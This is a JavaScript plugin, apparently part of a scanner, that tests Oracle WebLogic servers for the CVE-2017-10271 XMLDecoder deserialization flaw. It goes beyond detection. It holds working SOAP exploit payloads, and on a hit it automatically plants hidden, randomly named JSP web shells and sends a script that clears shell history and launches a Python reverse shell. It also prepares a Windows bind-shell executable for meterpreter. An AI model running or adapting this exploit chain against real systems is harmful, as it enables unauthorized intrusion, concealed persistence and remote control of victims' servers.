module.exports={
	tags:"weblogic,CVE-2017-10271,10271,3506",
	"ID":"030103",
	des:"CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
  /*<!--
    <void class="org.apache.commons.ognl.Ognl">
        <object method="getValue">
          <string><![CDATA[(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.addHeader('struts2','_struts2_'))]]></string>
          <object class="java.util.HashMap"></object>
        </object>
    </void>
    -->*/
		var _t = this,_s = this.self, szOld = url,bBreakFor1 = false,
       // 后期完善，尝试对多个path进行测试
       aPath = '/wls-wsat/CoordinatorPortType,/wls-wsat/CoordinatorPortType11,/wls-wsat/ParticipantPortType,/wls-wsat/ParticipantPortType11,/wls-wsat/RegistrationPortTypeRPC,/wls-wsat/RegistrationPortTypeRPC11,/wls-wsat/RegistrationRequesterPortType,/wls-wsat/RegistrationRequesterPortType11'.split(',');
/*
1、timebase
2、run
3、upload file
*/
    var s = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java class="java.beans.XMLDecoder">
    
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
    
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

*/}),s1_ = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[{code}]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),
// windows不能连接外网进行metasploit
s2 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <array class="java.lang.String" length="3">

          <object class="java.io.PrintWriter" index="1">
            <string>noWWW_P65533.txt</string><void method="println">
              <string><![CDATA[{code}]]></string></void><void method="close"/>
          </object>

          <void class="java.lang.ProcessBuilder" index="2">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>cmd.exe</string>
              </void>
              <void index="1">
                <string>/c</string>
              </void>
              <void index="2">
                <string><![CDATA[certutil -decode noWWW_P65533.txt noWWW_P65533.exe;noWWW_P65533.exe]]></string>
              </void>
            </array>
          <void method="start"/></void>

          <void class="java.lang.ProcessBuilder" index="3">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>cmd.exe</string>
              </void>
              <void index="1">
                <string>/c</string>
              </void>
              <void index="2">
                <string><![CDATA[certutil -decode noWWW_P65533.txt noWWW_P65533.exe;noWWW_P65533.exe]]></string>
              </void>
            </array>
          <void method="start"/></void>
          </array>

        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s5 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <object class="java.io.PrintWriter">
            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/.X11.jsp</string><void method="println">
              <string><![CDATA[{code}]]></string></void><void method="close"/>
        </object>
    </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

*/});

		var nNum = new Date().getTime()/1000,nTime = 0;
		// s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s5;
    var bBreakFor = false,hst = _s.parseUrl(url);
    // console.log(s);

    // console.log(hst);
    var oUrls ={};
    var fnTmp1 = function(p11,szPld,fnTmpCbk,szTUrl)
        {
           s = szPld||s;
           nNum = new Date().getTime()/1000,nTime = 0;
           nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
           s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
           var url1 = szOld.substr(0, szOld.indexOf('/',13));
           url = url1 + p11;// '/wls-wsat/CoordinatorPortType'
          // console.log(url);
          var oOpt = _s.fnOptHeader({
            method: 'POST',
            uri: url,
            body:szPld||s
              ,headers:
              {
                "Host":hst.host,
                "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                "Accept-Encoding":"zh-CN,zh",
                "content-type":"text/xml;charset=UTF-8"
              }});
          oOpt.timeout = nTime + 5000;
          _s.request(oOpt
            , function (error, response, body)
            {
              if(fnTmpCbk){fnTmpCbk(body,response,error,url1 + szTUrl);return;}
              _s.error(error);
              body = body || String(error);
              if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
              {
                _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));

                return;
              }
              var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
              // console.log(String(body));
              // console.log([nT,nT2]);

              // console.log(response.headers);
              // console.log(body);
              
              if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
              {
                var r = {vul:true,"body":String(body),href:response.request.uri.href,"url":szOld,"send":s,"des":
                  "发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
                  statusCode:(response && response.statusCode||0)};
                  // X-Powered-By,Set-Cookie,Date
                  // X-Pad: avoid browser bug
                // console.log(r);
                if(r.vul)
                {
                   bBreakFor1 = true;
                   
                   if(s == s1_||global.X11){s1_ = null;return}// 确保只执行一次
                   else if(s != s1_ && s1_)
                   {
                       global.X11=true;
                       
                       // 验证
                       var szRk = "ip:",fCbk = function(b,r,e,u)
                       {
                          if(-1 < u.indexOf('/wls-wsat/')||-1 < u.indexOf('/bea_wls_internal/'))
                          {
                            var aT = "bea_wls_cluster_internal;bea_wls_internal;wls-wsat;bea_wls_deployment_internal;bea_wls_management_internal2;consoleapp;uddiexplorer;uddi".split(/;/);
                            for(var j = 0; j < aT.length; j++)
                            {
                              if(bBreakFor)break;
                              (function(xUrl)
                              {
                                if(oUrls[xUrl])return;oUrls[xUrl]=1;
                                _s.log("start:\n curl '" + xUrl + "'");
                                // console.log("start " + xUrl);

                                // _s.fnGetRequest(_s.request,{timeout:1000})
                                _s.request.get(xUrl,function(e,r,b)
                                {
                                  _s.log("curl '" + xUrl + "'");
                                  b = String(b);
                                  // "Not Found;302 Moved Temporarily"
                                  if(-1 < b.indexOf(szRk))
                                  {
                                    j = 10000;aT = [];bBreakFor=true; // break for
                                    b = b.replace(/<[^>]+>/gmi,'').replace(/(^\s*)|(\s*$)/gmi,'');
                                    console.log("curl '" + xUrl + "'");
                                    if(b)console.log(b);
                                    _s.fs.appendFile("data/Ok.txt", xUrl + "\n",_s.log);
                                  }
                                  else _s.log(b);
                                });
                              })(u.replace(/wls\-wsat/gmi, aT[j]));
                            }
                          }
                       };
                       // all linux ok: ".X11.jsp",//  ".O0o2z.jsp",// ".O0o2z.jsp",// 
                       // 随机的优点：其他黑客扫描不到、不会因为上次文件的编译独占而影响新文件的上传和编译执行
                       var szJspName = ".O0"+ new Date().getTime() + ".jsp",
                          szCode = _s.fs.readFileSync("payload/clearHis.sh").toString("utf-8") +
                          "B64Jsp=\""+ _s.fs.readFileSync("payload/x.jsp").toString("base64") + "\"\n" +
                          _s.fs.readFileSync("payload/linuxShellX11.sh").toString("utf-8") +
                          _s.fs.readFileSync("payload/end.sh").toString("utf-8") + 
                          // linux反弹shell
                          _s.formatPayload("{code}","payload/linuxPyReverse.sh"),
                          // _s.fs.readFileSync("payload/linuxPyReverse.sh").toString("utf-8"),
                          sTmp1 = Buffer.from(szCode.replace(/\.X11\.jsp/gmi, szJspName)).toString("base64").replace(/[\r\n]/gmi,'');
                          // console.log(szCode);
                       // 处理、解决bash -c 不支持变量的问题
                       var szTmpFN = "./._t_",s1_1 = _s.formatPayload(s1_, "echo " + sTmp1 + "|base64 -d>" + szTmpFN + ";chmod +x " + szTmpFN + ";" + szTmpFN + ";rm " + szTmpFN);
                       // console.log(szJspName);
                       _s.log("send payload: linux, bash make all war/*.jsp web shell");
                       fnTmp1(aPath[0],s = s1_1,fCbk,"/wls-wsat/" + szJspName);

                       // win is ok: /bea_wls_internal/.X11.jsp?ls=netstat -ant
                       _s.log("send payload: win or linux ,web shell x.jsp to bea_wls_internal/");
                       s5 = _s.formatPayload(s5, "payload/x.jsp");
                       s5 = s5.replace(/\.X11\.jsp/gmi, szJspName);
                       fnTmp1(aPath[0],s = s5,fCbk,'/bea_wls_internal/' + szJspName + '?ls=whoami');

                       // win no www, to meterpreter readying?
                       _s.log("send payload: windows no www, run bind exe to meterpreter port 65533");
                       var szDuo = s2;
                       szDuo = szDuo.replace(/\{code\}/gmi,_s.fs.readFileSync("payload/noWWW_P65533.exe").toString("base64"));
                       // fnTmp1(aPath[0],s = szDuo);
                       
                   }
                }
                fnCbk(r,_t);
              }
              else _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));
              //console.log(body);
             }
           );
        };
    for(var i = 0; i < aPath.length; i++)
    {
      if(bBreakFor1)break;
      fnTmp1(aPath[i]);
    }
	}
};